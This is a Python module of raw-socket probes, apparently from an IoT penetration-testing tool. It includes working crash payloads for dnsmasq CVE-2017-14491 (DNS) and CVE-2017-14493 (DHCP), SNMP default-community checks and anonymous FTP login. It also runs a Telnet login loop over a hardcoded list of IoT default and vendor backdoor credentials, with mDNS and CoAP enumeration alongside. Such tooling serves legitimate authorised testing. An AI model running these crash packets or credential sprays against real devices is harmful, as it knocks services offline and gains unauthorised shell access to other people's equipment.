"""
Packet-level probes using raw sockets (pure Python, no scapy).

Probes available:
  dnsmasq_dns    — CVE-2017-14491 (DNS heap overflow via crafted long name)
  dnsmasq_dhcp   — CVE-2017-14493 (DHCP stack overflow via oversized client-id)
  snmp_community — SNMP default community string read (public/private)
  ftp_anon       — Anonymous FTP login attempt
  telnet_creds   — Telnet login with a list of common IoT credential pairs
  mdns_enum      — mDNS/Bonjour service enumeration (PTR _services._dns-sd._udp.local)
  coap_discover  — CoAP /.well-known/core resource discovery (RFC 6690)

All probes return: {"success": bool, "output": str, "error_type": str}
"""

import socket
import struct
import time
from typing import Dict, Any

from loguru import logger


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _udp_send_recv(target_ip: str, port: int, payload: bytes, timeout: float = 3.0) -> bytes:
    """Send a single UDP datagram and wait for a reply. Returns bytes or b''."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    try:
        sock.sendto(payload, (target_ip, port))
        data, _ = sock.recvfrom(2048)
        return data
    except socket.timeout:
        return b""
    except OSError:
        return b""
    finally:
        sock.close()


def _tcp_reachable(target_ip: str, port: int, timeout: float = 2.0) -> bool:
    """Quick TCP connectivity check."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((target_ip, port))
        s.close()
        return result == 0
    except OSError:
        return False


# ---------------------------------------------------------------------------
# DNS probe — CVE-2017-14491
# ---------------------------------------------------------------------------

# El constructor de consultas DNS vive en `iot_probes`, que es donde lo usan las
# sondas del catálogo. Aquí existía una segunda copia, byte a byte equivalente
# salvo por el `txid` por defecto: dos implementaciones del mismo formato que
# había que mantener sincronizadas sin que nada lo comprobara. La importación va
# en este sentido —el módulo confinado a `scapy` (§4.4.1) depende del general, y
# no al revés— para no arrastrar `scapy` a la ruta principal.
from modules.iot_probes import _build_dns_query  # noqa: E402


def probe_dnsmasq_dns_overflow(target_ip: str, dns_port: int = 53, timeout: float = 5.0) -> Dict[str, Any]:
    """
    CVE-2017-14491 — dnsmasq < 2.78: heap buffer overflow via >127 DNS labels.

    Strategy:
    1. Confirm DNS service is responding with a benign query.
    2. Send a crafted query with 128 single-char labels (triggers overflow).
    3. Re-probe with a normal query after 0.8 s.
    4. If the service no longer responds → crash → VULNERABLE.
    """
    # Step 1 — sanity check
    normal_query = _build_dns_query("example.com", txid=0xBEEF)
    resp = _udp_send_recv(target_ip, dns_port, normal_query, timeout=2.0)
    if not resp:
        return {
            "success": False,
            "output": (
                f"[CVE-2017-14491] DNS port {dns_port} on {target_ip} did not respond to "
                "a normal query — service may not be running or port is filtered."
            ),
            "error_type": "NETWORK",
        }

    # Step 2 — crafted overflow query (128 single-char labels)
    overflow_name = ".".join(["a"] * 128) + ".com"
    overflow_query = _build_dns_query(overflow_name, txid=0xDEAD)
    try:
        _udp_send_recv(target_ip, dns_port, overflow_query, timeout=timeout)
    except Exception:
        pass  # crash may drop the connection — that's expected

    # Step 3 — post-crash probe
    time.sleep(0.8)
    post_resp = _udp_send_recv(target_ip, dns_port, _build_dns_query("test.com", txid=0xCAFE), timeout=2.5)

    if not post_resp:
        return {
            "success": True,
            "output": (
                f"[CVE-2017-14491] VULNERABLE — DNS service on {target_ip}:{dns_port} "
                "stopped responding after crafted 128-label query. "
                "Indicates heap overflow crash (dnsmasq < 2.78)."
            ),
            "error_type": "NONE",
        }
    return {
        "success": False,
        "output": (
            f"[CVE-2017-14491] DNS service on {target_ip}:{dns_port} survived the crafted query. "
            "Service appears patched or running a non-vulnerable dnsmasq version."
        ),
        "error_type": "FAIL",
    }


# ---------------------------------------------------------------------------
# DHCP probe — CVE-2017-14493
# ---------------------------------------------------------------------------

def _build_dhcp_discover_with_oversized_client_id(oversized_bytes: int = 100) -> bytes:
    """
    Build a raw DHCPv4 DISCOVER packet with an oversized client identifier (option 61).
    CVE-2017-14493 triggers a stack overflow when client-id length > ~75 bytes.
    """
    # Ethernet not needed here — we send via raw UDP socket
    # BOOTP / DHCP payload
    op      = 1           # BOOTREQUEST
    htype   = 1           # Ethernet
    hlen    = 6
    hops    = 0
    xid     = 0xDEADBEEF
    secs    = 0
    flags   = 0x8000      # Broadcast
    ciaddr  = b"\x00" * 4
    yiaddr  = b"\x00" * 4
    siaddr  = b"\x00" * 4
    giaddr  = b"\x00" * 4
    chaddr  = b"\xde\xad\xbe\xef\x00\x01" + b"\x00" * 10

    header = struct.pack(">BBBBIHH", op, htype, hlen, hops,
                         xid, secs, flags) + ciaddr + yiaddr + siaddr + giaddr
    header += chaddr
    header += b"\x00" * 64   # sname
    header += b"\x00" * 128  # file
    header += b"\x63\x82\x53\x63"  # DHCP magic cookie

    # Options
    # 53 = DHCP Message Type = DISCOVER (1)
    opts  = bytes([53, 1, 1])
    # 61 = Client Identifier (oversized)
    client_id = b"\x01" + b"\xAA" * oversized_bytes   # hardware type 1 + padding
    opts += bytes([61, len(client_id)]) + client_id
    opts += bytes([255])  # END

    return header + opts


def probe_dnsmasq_dhcp_overflow(target_ip: str, dhcp_port: int = 67, timeout: float = 5.0) -> Dict[str, Any]:
    """
    CVE-2017-14493 — dnsmasq < 2.78: DHCPv4 stack buffer overflow.

    Note: DHCP typically requires layer-2 adjacency or a DHCP relay.
    If the target is reachable directly on port 67/UDP, this probe is valid.
    """
    # Pre-check: try sending a normal DISCOVER first
    pkt = _build_dhcp_discover_with_oversized_client_id(oversized_bytes=100)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.settimeout(timeout)
        sock.sendto(pkt, (target_ip, dhcp_port))
        try:
            data, _ = sock.recvfrom(1024)
            got_response = len(data) > 0
        except socket.timeout:
            got_response = False
        sock.close()
    except PermissionError:
        return {
            "success": False,
            "output": "Permission denied — DHCP probe requires root/sudo for raw socket broadcast.",
            "error_type": "PERMISSION",
        }
    except OSError as e:
        return {
            "success": False,
            "output": f"[CVE-2017-14493] DHCP probe socket error: {e}",
            "error_type": "NETWORK",
        }

    # After sending oversized client-id, check if DHCP server is still alive
    time.sleep(0.5)

    # Second probe with a benign DISCOVER
    normal_pkt = _build_dhcp_discover_with_oversized_client_id(oversized_bytes=6)
    try:
        sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock2.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock2.settimeout(2.5)
        sock2.sendto(normal_pkt, (target_ip, dhcp_port))
        try:
            post_data, _ = sock2.recvfrom(1024)
            service_alive = len(post_data) > 0
        except socket.timeout:
            service_alive = False
        sock2.close()
    except OSError:
        service_alive = False

    if not got_response and not service_alive:
        return {
            "success": False,
            "output": (
                f"[CVE-2017-14493] DHCP service on {target_ip}:{dhcp_port} did not respond "
                "to any packet. Port may be filtered or DHCP requires L2 adjacency."
            ),
            "error_type": "NETWORK",
        }

    if got_response and not service_alive:
        return {
            "success": True,
            "output": (
                f"[CVE-2017-14493] VULNERABLE — DHCP service on {target_ip} responded to "
                "initial probe but crashed after oversized client-id option (100 bytes). "
                "Consistent with dnsmasq < 2.78 stack overflow."
            ),
            "error_type": "NONE",
        }

    return {
        "success": False,
        "output": (
            f"[CVE-2017-14493] DHCP service on {target_ip} survived the oversized client-id probe. "
            "Service appears patched or DHCP relay is filtering options."
        ),
        "error_type": "FAIL",
    }


# ---------------------------------------------------------------------------
# SNMP community string probe
# ---------------------------------------------------------------------------

def _build_snmpv1_get(community: str, oid_bytes: bytes, request_id: int = 1) -> bytes:
    """Build a minimal SNMPv1 GetRequest PDU for a given OID."""

    def tlv(tag: int, value: bytes) -> bytes:
        return bytes([tag, len(value)]) + value

    # OID value (already encoded as BER)
    varbind = tlv(0x30, tlv(0x06, oid_bytes) + tlv(0x05, b""))
    varbindlist = tlv(0x30, varbind)

    # GetRequest PDU: [0]
    req_id_tlv = tlv(0x02, request_id.to_bytes(2, "big"))
    error_status = tlv(0x02, b"\x00")
    error_index  = tlv(0x02, b"\x00")
    pdu = tlv(0xa0, req_id_tlv + error_status + error_index + varbindlist)

    # SNMP message: SEQUENCE { INTEGER(0), OCTET STRING(community), PDU }
    version   = tlv(0x02, b"\x00")
    comm_asn  = tlv(0x04, community.encode("ascii"))
    return tlv(0x30, version + comm_asn + pdu)


# BER-encoded OID for sysDescr: 1.3.6.1.2.1.1.1.0
_OID_SYSDESCR = bytes([0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00])


def probe_snmp_community(
    target_ip: str,
    community: str = "public",
    port: int = 161,
    timeout: float = 3.0,
) -> Dict[str, Any]:
    """
    Tests whether the SNMP community string is accepted.
    Sends SNMPv1 GetRequest for sysDescr (1.3.6.1.2.1.1.1.0).
    A response means the community is valid (potential information disclosure / pivot).
    """
    pkt = _build_snmpv1_get(community, _OID_SYSDESCR)
    resp = _udp_send_recv(target_ip, port, pkt, timeout=timeout)

    if resp and len(resp) > 12:
        # Attempt to extract the sysDescr string value
        sys_descr = ""
        try:
            # Look for OCTET STRING (0x04) tag after the community + PDU wrapping
            idx = resp.find(b"\x04", 30)  # skip SNMP header
            if idx != -1:
                slen = resp[idx + 1]
                sys_descr = resp[idx + 2: idx + 2 + slen].decode("utf-8", errors="replace")
        except Exception:
            sys_descr = resp[20:80].hex()

        return {
            "success": True,
            "output": (
                f"[SNMP] Community '{community}' ACCEPTED by {target_ip}:{port}. "
                f"sysDescr: {sys_descr[:300] or '(could not decode)'}"
            ),
            "error_type": "NONE",
        }

    # Already tried a fallback community — don't recurse, just report failure.
    fallback_communities = ["private", "admin", "manager", ""]
    if community in fallback_communities:
        return {
            "success": False,
            "output": (
                f"[SNMP] Community '{community}' rejected or no response from "
                f"{target_ip}:{port}. Port may be filtered or SNMPv1 not enabled."
            ),
            "error_type": "FAIL",
        }

    # Called with 'public' (or another non-fallback community) — auto-retry with 'private'
    resp2 = _udp_send_recv(
        target_ip, port,
        _build_snmpv1_get("private", _OID_SYSDESCR),
        timeout=timeout,
    )
    if resp2 and len(resp2) > 12:
        return {
            "success": True,
            "output": (
                f"[SNMP] Community 'private' ACCEPTED by {target_ip}:{port}. "
                "Default SNMP community string confirmed."
            ),
            "error_type": "NONE",
        }

    return {
        "success": False,
        "output": (
            f"[SNMP] Neither 'public' nor 'private' community strings accepted by "
            f"{target_ip}:{port}. SNMP may be disabled or community strings changed."
        ),
        "error_type": "FAIL",
    }


# ---------------------------------------------------------------------------
# FTP anonymous login probe
# ---------------------------------------------------------------------------

def probe_ftp_anonymous(target_ip: str, ftp_port: int = 21, timeout: float = 5.0) -> Dict[str, Any]:
    """
    Tests anonymous FTP login on the target.
    Sends USER anonymous / PASS anonymous@ and checks for 230 response.
    """
    if not _tcp_reachable(target_ip, ftp_port, timeout=2.0):
        return {
            "success": False,
            "output": f"[FTP] Port {ftp_port} on {target_ip} not reachable.",
            "error_type": "NETWORK",
        }

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        try:
            s.connect((target_ip, ftp_port))
        except (socket.timeout, OSError) as e:
            return {
                "success": False,
                "output": f"[FTP] Connection to {target_ip}:{ftp_port} failed: {e}",
                "error_type": "NETWORK",
            }

        banner = s.recv(1024).decode("utf-8", errors="replace").strip()
        s.sendall(b"USER anonymous\r\n")
        user_resp = s.recv(1024).decode("utf-8", errors="replace").strip()
        s.sendall(b"PASS anonymous@example.com\r\n")
        pass_resp = s.recv(1024).decode("utf-8", errors="replace").strip()
        try:
            s.sendall(b"QUIT\r\n")
        except OSError:
            pass

        combined = f"Banner: {banner}\nUSER response: {user_resp}\nPASS response: {pass_resp}"

        if pass_resp.startswith("230") or "logged in" in pass_resp.lower():
            return {
                "success": True,
                "output": (
                    f"[FTP] Anonymous login ACCEPTED on {target_ip}:{ftp_port}.\n{combined}"
                ),
                "error_type": "NONE",
            }
        return {
            "success": False,
            "output": f"[FTP] Anonymous login rejected on {target_ip}:{ftp_port}.\n{combined}",
            "error_type": "FAIL",
        }
    except socket.timeout:
        return {
            "success": False,
            "output": f"[FTP] Connection to {target_ip}:{ftp_port} timed out.",
            "error_type": "NETWORK",
        }
    except OSError as e:
        return {
            "success": False,
            "output": f"[FTP] Socket error: {e}",
            "error_type": "CRASH",
        }
    finally:
        try:
            s.close()
        except OSError:
            pass


# ---------------------------------------------------------------------------
# Telnet banner / credential probe (pure Python — no nc needed)
# ---------------------------------------------------------------------------

# Known IoT default/backdoor credentials.
# This is *data*, not per-device logic: every pair here maps to a publicly
# documented CVE or vendor default. Extend freely; no device-specific branches.
DEFAULT_TELNET_CREDENTIALS: list[tuple[str, str]] = [
    # --- Generic IoT defaults ---
    ("admin", "admin"),
    ("admin", ""),
    ("admin", "password"),
    ("admin", "1234"),
    ("root", "root"),
    ("root", ""),
    ("root", "toor"),
    ("root", "admin"),
    ("root", "12345"),
    ("root", "vizxv"),              # Dahua cameras / Mirai scanner
    ("root", "xc3511"),             # Xiongmai DVR / Mirai
    ("root", "888888"),             # Dahua DVR
    ("root", "54321"),              # ZTE routers
    ("root", "anko"),               # Anko WiFi cams
    ("root", "Zte521"),             # ZTE
    ("user", "user"),
    ("guest", "guest"),
    ("support", "support"),
    # --- Publicly disclosed vendor backdoors (tied to CVEs) ---
    ("alphanetworks", "wrgnd08_dlob_dir815"),  # D-Link DIR-815 (CVE-2019-18852)
    ("Alphanetworks", "wrgg15_di524"),         # D-Link older DIR
    ("supervisor", "zyad1234"),                # ZyXEL (CVE-2020-29583)
    ("zyfwp", "PrOw!aN_fXp"),                  # ZyXEL backdoor (CVE-2020-29583)
    ("default", "OxhlwSG8"),                   # D-Link DCS cameras
    ("service", "service"),                    # Netgear legacy
    ("telecomadmin", "admintelecom"),          # Huawei GPON
    ("cisco", "cisco"),
    ("ubnt", "ubnt"),                          # Ubiquiti default
]

# Shell-prompt signals. Generic plus a couple of well-known backdoor echoes
# (alphanetworks for D-Link DIR-815 CVE-2019-18852) so we can confirm even
# when the shell prompt is non-standard.
_TELNET_SUCCESS_SIGNALS: tuple[str, ...] = (
    "# ", "$ ", "~ #", "/ #", "~ $", "/ $",
    "busybox", "login successful", "welcome to",
    "alphanetworks",   # D-Link DIR-815 banner/echo (CVE-2019-18852)
)


def _safe_recv(s: "socket.socket", bufsize: int = 4096) -> bytes:
    """Recv that tolerates timeouts *and* 'I/O on closed file' or reset."""
    try:
        return s.recv(bufsize)
    except (socket.timeout, OSError, ValueError):
        return b""


def _safe_sendall(s: "socket.socket", data: bytes) -> bool:
    """Sendall that tolerates the peer closing the connection mid-stream."""
    try:
        s.sendall(data)
        return True
    except (OSError, ValueError):
        return False


def _telnet_try_login(
    target_ip: str,
    telnet_port: int,
    username: str,
    password: str,
    timeout: float,
) -> tuple[bool, bool, str]:
    """
    Single-attempt Telnet login.
    Returns (shell_obtained, prompt_seen, transcript_snippet).
    Never raises — socket errors map to a failed attempt.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        try:
            s.connect((target_ip, telnet_port))
        except (OSError, socket.timeout):
            return False, False, ""

        time.sleep(0.5)
        raw = _safe_recv(s)

        # Respond WON'T/DON'T to any IAC DO/WILL negotiation
        i = 0
        while i < len(raw):
            if raw[i] == 0xFF and i + 2 < len(raw):
                cmd = raw[i + 1]
                if cmd in (0xFD, 0xFB):
                    if not _safe_sendall(s, bytes([0xFF, 0xFC if cmd == 0xFD else 0xFE, raw[i + 2]])):
                        break
                i += 3
            else:
                i += 1

        time.sleep(0.3)
        if not _safe_sendall(s, (username + "\n").encode()):
            return False, False, raw.decode("utf-8", errors="replace")[:400]
        time.sleep(1.0)
        login_resp = _safe_recv(s)

        if not _safe_sendall(s, (password + "\n").encode()):
            transcript = (raw + login_resp).decode("utf-8", errors="replace")
            return False, "login" in transcript.lower() or "password" in transcript.lower(), transcript[:400]
        time.sleep(1.5)
        shell_resp = _safe_recv(s)

        transcript = (
            raw.decode("utf-8", errors="replace")
            + login_resp.decode("utf-8", errors="replace")
            + shell_resp.decode("utf-8", errors="replace")
        )
        low = transcript.lower()
        shell_ok = any(sig in low for sig in _TELNET_SUCCESS_SIGNALS)
        prompt_seen = ("login" in low) or ("password" in low)
        return shell_ok, prompt_seen, transcript[:400]
    finally:
        try:
            s.close()
        except OSError:
            pass


def probe_telnet_credentials(
    target_ip: str,
    username: str | None = None,
    password: str | None = None,
    credentials: list[tuple[str, str]] | None = None,
    telnet_port: int = 23,
    timeout: float = 8.0,
) -> Dict[str, Any]:
    """
    Iterates a list of generic default credentials against Telnet.

    - If `username` AND `password` are both provided → single attempt (advanced caller).
    - Otherwise iterate `credentials` (default: DEFAULT_TELNET_CREDENTIALS).

    No device-specific hardcoding.
    """
    if not _tcp_reachable(target_ip, telnet_port, timeout=2.0):
        return {
            "success": False,
            "output": f"[TELNET] Port {telnet_port} on {target_ip} not reachable.",
            "error_type": "NETWORK",
        }

    if username is not None and password is not None:
        pairs = [(username, password)]
    else:
        pairs = list(credentials or DEFAULT_TELNET_CREDENTIALS)

    any_prompt_seen = False
    last_transcript = ""
    attempted: list[str] = []

    for user, pw in pairs:
        attempted.append(f"{user!r}/{pw!r}")
        try:
            shell_ok, prompt_seen, transcript = _telnet_try_login(
                target_ip, telnet_port, user, pw, timeout
            )
        except socket.timeout:
            return {
                "success": False,
                "output": (
                    f"[TELNET] Connection to {target_ip}:{telnet_port} timed out "
                    f"after trying: {', '.join(attempted)}"
                ),
                "error_type": "NETWORK",
            }
        except OSError as exc:
            return {
                "success": False,
                "output": f"[TELNET] Socket error while trying {user!r}: {exc}",
                "error_type": "CRASH",
            }

        last_transcript = transcript
        if prompt_seen:
            any_prompt_seen = True
        if shell_ok:
            return {
                "success": True,
                "output": (
                    f"[TELNET] Login SUCCESSFUL on {target_ip}:{telnet_port} "
                    f"with credentials {user!r} / {pw!r}.\n"
                    f"Response snippet: {transcript[:300]}"
                ),
                "error_type": "NONE",
            }

    if any_prompt_seen:
        return {
            "success": False,
            "output": (
                f"[TELNET] All {len(pairs)} default credential pairs rejected on "
                f"{target_ip}:{telnet_port}. Attempted: {', '.join(attempted)}.\n"
                f"Last transcript: {last_transcript[:300]}"
            ),
            "error_type": "FAIL",
        }

    return {
        "success": False,
        "output": (
            f"[TELNET] No login prompt detected on {target_ip}:{telnet_port}. "
            f"Service may require specific negotiation or is not a standard Telnet daemon."
        ),
        "error_type": "FAIL",
    }


# ---------------------------------------------------------------------------
# mDNS enumeration — unicast DNS query to target:5353
# ---------------------------------------------------------------------------

def _build_mdns_ptr_query(name: str = "_services._dns-sd._udp.local", txid: int = 0) -> bytes:
    """Build an mDNS PTR query for service enumeration (RFC 6763)."""
    header = struct.pack(">HHHHHH", txid, 0x0000, 1, 0, 0, 0)
    question = b""
    for label in name.rstrip(".").split("."):
        enc = label.encode()
        question += bytes([len(enc)]) + enc
    question += b"\x00"
    question += struct.pack(">HH", 12, 1)   # QTYPE=PTR(12), QCLASS=IN(1)
    return header + question


def _parse_dns_names(data: bytes, max_records: int = 16) -> list[str]:
    """Extract labels from a DNS response. Tolerant of compression pointers."""
    names: list[str] = []
    if len(data) < 12:
        return names
    # Skip header + question section (we sent exactly one question)
    idx = 12
    # Skip QNAME
    while idx < len(data):
        ln = data[idx]
        if ln == 0:
            idx += 1
            break
        if ln & 0xC0:  # pointer
            idx += 2
            break
        idx += 1 + ln
    idx += 4  # QTYPE + QCLASS

    def read_name(start: int) -> tuple[str, int]:
        labels: list[str] = []
        pos = start
        jumped = False
        cursor_after = start
        steps = 0
        while pos < len(data) and steps < 64:
            steps += 1
            ln = data[pos]
            if ln == 0:
                pos += 1
                if not jumped:
                    cursor_after = pos
                return ".".join(labels), cursor_after
            if ln & 0xC0:
                if pos + 1 >= len(data):
                    return ".".join(labels), cursor_after
                ptr = ((ln & 0x3F) << 8) | data[pos + 1]
                if not jumped:
                    cursor_after = pos + 2
                pos = ptr
                jumped = True
                continue
            pos += 1
            labels.append(data[pos:pos + ln].decode("utf-8", errors="replace"))
            pos += ln
        return ".".join(labels), cursor_after

    count = 0
    while idx < len(data) and count < max_records:
        try:
            name, new_idx = read_name(idx)
            idx = new_idx
            if idx + 10 > len(data):
                break
            rtype, _rclass, _ttl, rdlen = struct.unpack(">HHIH", data[idx:idx + 10])
            idx += 10
            if rtype == 12 and rdlen > 0:  # PTR
                pname, _ = read_name(idx)
                if pname:
                    names.append(pname)
            idx += rdlen
            count += 1
        except (struct.error, IndexError):
            break
    return names


def probe_mdns_enum(target_ip: str, port: int = 5353, timeout: float = 3.0) -> Dict[str, Any]:
    """Unicast mDNS PTR query for _services._dns-sd._udp.local."""
    pkt = _build_mdns_ptr_query()
    resp = _udp_send_recv(target_ip, port, pkt, timeout=timeout)
    if not resp:
        return {
            "success": False,
            "output": (
                f"[MDNS] No response from {target_ip}:{port}. mDNS may require "
                "multicast (224.0.0.251) or is disabled."
            ),
            "error_type": "NETWORK",
        }

    services = _parse_dns_names(resp)
    if services:
        preview = ", ".join(services[:10])
        return {
            "success": True,
            "output": (
                f"[MDNS] {target_ip}:{port} advertised {len(services)} service(s). "
                f"First: {preview}"
            ),
            "error_type": "NONE",
        }
    return {
        "success": False,
        "output": (
            f"[MDNS] {target_ip}:{port} responded but no PTR records decoded "
            f"(raw length {len(resp)} bytes)."
        ),
        "error_type": "FAIL",
    }


# ---------------------------------------------------------------------------
# CoAP resource discovery — GET /.well-known/core (RFC 6690)
# ---------------------------------------------------------------------------

def _build_coap_get_wellknown_core(mid: int = 0x1234) -> bytes:
    """Build a CoAP CON GET /.well-known/core request."""
    header = bytes([
        0x40,                 # ver=1, type=CON, tkl=0
        0x01,                 # code=0.01 GET
        (mid >> 8) & 0xFF,
        mid & 0xFF,
    ])
    # Option 11 Uri-Path ".well-known" (delta=11, length=11) — both nibbles < 13
    part1 = b".well-known"
    opt1 = bytes([(11 << 4) | len(part1)]) + part1
    # Option 11 Uri-Path "core" (delta=0, length=4)
    part2 = b"core"
    opt2 = bytes([(0 << 4) | len(part2)]) + part2
    return header + opt1 + opt2


def probe_coap_discover(target_ip: str, port: int = 5683, timeout: float = 3.0) -> Dict[str, Any]:
    """CoAP discovery: request /.well-known/core and parse link-format payload."""
    pkt = _build_coap_get_wellknown_core()
    resp = _udp_send_recv(target_ip, port, pkt, timeout=timeout)
    if not resp or len(resp) < 4:
        return {
            "success": False,
            "output": (
                f"[COAP] No response from {target_ip}:{port}. CoAP may be disabled "
                "or blocked by firewall."
            ),
            "error_type": "NETWORK",
        }

    # Response code: second byte (upper 3 bits class, lower 5 detail)
    code_byte = resp[1]
    code_class = (code_byte >> 5) & 0x7
    code_detail = code_byte & 0x1F
    code_str = f"{code_class}.{code_detail:02d}"

    # Find payload marker 0xFF — payload follows until end of datagram
    try:
        marker = resp.index(0xFF, 4)
        payload = resp[marker + 1:].decode("utf-8", errors="replace")
    except ValueError:
        payload = ""

    if code_class == 2 and payload:
        # Count advertised resources in link-format (comma-separated)
        resources = [r.strip() for r in payload.split(",") if r.strip()]
        preview = " | ".join(resources[:5])
        return {
            "success": True,
            "output": (
                f"[COAP] {target_ip}:{port} /.well-known/core → {code_str}, "
                f"{len(resources)} resource(s) advertised. First: {preview}"
            ),
            "error_type": "NONE",
        }

    return {
        "success": False,
        "output": (
            f"[COAP] {target_ip}:{port} responded with code {code_str}, no usable payload."
        ),
        "error_type": "FAIL",
    }


# ---------------------------------------------------------------------------
# Probe dispatcher
# ---------------------------------------------------------------------------

PROBE_REGISTRY = {
    "dnsmasq_dns":    probe_dnsmasq_dns_overflow,
    "dnsmasq_dhcp":   probe_dnsmasq_dhcp_overflow,
    "snmp_community": probe_snmp_community,
    "ftp_anon":       probe_ftp_anonymous,
    "telnet_creds":   probe_telnet_credentials,
    "mdns_enum":      probe_mdns_enum,
    "coap_discover":  probe_coap_discover,
}


def run_probe(probe_name: str, target_ip: str, **kwargs) -> Dict[str, Any]:
    """
    Dispatch entry point for PROBE: commands in execute_poc.

    Usage:
      run_probe("snmp_community", "192.168.0.1")
      run_probe("telnet_creds", "192.168.0.1", username="admin", password="admin")
      run_probe("dnsmasq_dns", "192.168.0.1")
    """
    probe_fn = PROBE_REGISTRY.get(probe_name)
    if probe_fn is None:
        return {
            "success": False,
            "output": (
                f"Unknown probe '{probe_name}'. "
                f"Available probes: {sorted(PROBE_REGISTRY.keys())}"
            ),
            "error_type": "UNKNOWN",
        }
    try:
        logger.info(f"[PROBE] Running {probe_name} against {target_ip}")
        result = probe_fn(target_ip, **kwargs)
        logger.bind(command_execution=True, target_ip=target_ip).info(
            f"PROBE:{probe_name} → success={result.get('success')}"
        )
        return result
    except Exception as exc:
        logger.error(f"[PROBE] {probe_name} raised exception: {exc}", exc_info=True)
        return {
            "success": False,
            "output": f"Probe {probe_name} raised an unexpected error: {exc}",
            "error_type": "CRASH",
        }
